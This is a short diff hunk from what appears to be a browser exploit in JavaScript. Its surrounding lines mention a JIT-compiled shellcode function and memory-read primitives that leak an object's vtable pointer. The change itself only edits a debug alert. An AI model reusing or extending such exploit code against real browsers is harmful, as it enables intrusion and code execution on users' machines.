@@ -985,7 +985,7 @@ var shellcodeFunc = makeJITCompiledFunction();
 
         var el_addr = primitives.readInt64(wrapper_addr + 0x18)
         var vtab = primitives.readInt64(el_addr);
-    alert('vtabint64'+vtab + 'vtab64' + primitives.read64(el_addr));
+    alert(vtab + primitives.read64(el_addr));
     
 }
 function init() {
